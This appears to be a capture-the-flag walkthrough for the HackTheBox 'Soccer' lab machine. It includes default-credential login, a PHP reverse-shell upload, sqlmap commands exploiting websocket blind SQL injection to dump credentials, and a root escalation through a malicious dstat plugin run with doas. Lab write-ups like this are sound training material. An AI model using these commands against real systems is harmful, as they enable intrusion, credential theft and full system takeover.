## Takeaway
-  Any time  trying SQLI with an integer value, it’s worth trying without a `'` as well. The `'` is used to close strings, but if the input is being handled as an integer, perhaps just an ` or 1=1– - `will work`
## Metadata
- Run` feroxbuster -u http://soccer.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt  -x "txt,html,php,asp,aspx,jsp" -t 10 -k -e -r ` to locate the hidden `tiny file manage`r application.![[Pasted image 20240311135420.png]]![[Pasted image 20240311135525.png]]
	- Default admin credential `admin:admin@123` works here.
- Enumerate as `www-data`, one can locate another virtual host `soc-player.soccer.htb`.![[Pasted image 20240311141143.png]]
	- Add `10.10.11.194 soc-player.soccer.htb` to `/etc/hosts`.
	- Run `feroxbuster -u http://soc-player.soccer.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -t 10 -k -e -r` will identify `/check` but one needs to create account and login in to access.![[Pasted image 20240311144820.png]]
	- We can see that the page is subjected to `blind SQLi` since ticket id `1234` does not actually exist.![[Pasted image 20240311144952.png]]
	- Use `sqlmap` to exfiltrate data.
		- `sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10` to dump databases.
		- `sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10` to dump tables.
		- `sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10` to dump table entries to get credential `player@player.htb:PlayerOftheMatch2022`
- Running `linpeas` as `player` will identify `doas` is installed.![[Pasted image 20240311151425.png]]
	- Run `find / -type f -name *doas*` to locate configuration.![[Pasted image 20240311151522.png]]
	- Looking at the configuration, `player` can run `dstat` as `root` without password. ![[Pasted image 20240311151559.png]]
# Exploitation
### Shell as www-data
- Login using `admin:admin@123` and upload `rev.php` to `uploads` folder.![[Pasted image 20240311135722.png]]
- Set up listener and navigate to `upload` folder and hit `direct link` button to trigger reverse shell.![[Pasted image 20240311135754.png]]
### Shell as player
- Run `ssh player@10.10.11.194` to use newly discovered credential to obtain an SSH session.
# PrivEsc
- Run following to get a root shell.
```shell
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py 
doas /usr/bin/dstat --xxx
```